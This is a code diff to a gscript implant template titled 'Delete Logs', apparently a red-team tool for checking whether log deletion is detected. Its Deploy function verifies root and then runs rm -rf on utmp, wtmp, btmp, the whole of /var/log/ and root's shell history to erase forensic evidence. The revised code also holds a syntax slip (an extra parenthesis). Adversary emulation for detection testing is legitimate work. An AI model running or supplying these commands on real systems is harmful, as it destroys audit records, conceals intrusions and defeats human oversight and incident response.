@@ -1,38 +1,42 @@
 // Example gscript template
 // Title: Delete Logs
-// Author: Jay Hill
+// Author: ahhh
 // Purpose: Deletes a number of critical security logs on a linux machine, to see if this is detected by the lack of logs or deletion
-// Gscript version: 0.1.2
+// Gscript version: 1.0.0
 // ATT&CK: https://attack.mitre.org/wiki/Technique/T1146
 // Note: must run implant as root
+
+//go_import:os/user as user2
 
 //priority:150
 //timeout:150
 
-function BeforeDeploy() {
-  LogInfo("starting execution of Delete Logs");
-  var well = GetUser();
-  LogInfo("Our user is: "+well.username);
-  if (well.username == "root") {
-    return true;
-  } else {
-    LogInfo("Detected a non-root user, this needs to run as root!");
-    Halt();
-    return false;
-  }
-  return true; 
-}
-
 function Deploy() {  
-  //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
-  ForkExecuteCommand("rm", ["-rf", "-P", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
-  LogInfo("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
-  ForkExecuteCommand("rm", ["-rf", "-P", "/var/root/.sh_history"]);
-  LogInfo("Cleared the root bash history");
-  return true;
-}
-
-function AfterDeploy() {
-  LogInfo("done Delete Logs");
-  return true;
-}
+    console.log("starting execution of Delete Logs");
+    // Whoami
+    var myuser = user2.Current();
+    console.log("Our user is: "+Dump(myuser[0]));
+    if (myuser[0] == "root") {
+        //rm -rf /var/run/utmp /var/run/wtmp /var/run/btmp /var/log/
+        var response = G.exec.ExecuteCommand("rm", ["-rf", "-P", "/var/run/utmp", "/var/run/wtmp", "/var/run/btmp", "/var/log/"]);
+        console.log("Pid: "+response[0]);
+        console.log("stdout: "+response[1]);
+        console.log("stderr: "+response[2]);
+        console.log("exit code: "+response[3]);
+        console.log("go errors: "+response[4]);
+        console.log("Removed /var/run/utmp, /var/run/wtmp, /var/run/btmp, and all of /var/log/");
+        var response2 = G.exec.ExecuteCommand(("rm", ["-rf", "-P", "/var/root/.sh_history"]);
+        console.log("Pid: "+response2[0]);
+        console.log("stdout: "+response2[1]);
+        console.log("stderr: "+response2[2]);
+        console.log("exit code: "+response2[3]);
+        console.log("go errors: "+response2[4]);
+        console.log("Cleared the root bash history");
+        return true;
+    } else {
+      console.log("Detected a non-root user, this needs to run as root!");
+      //Halt();
+      return false;
+    } 
+  }
+  
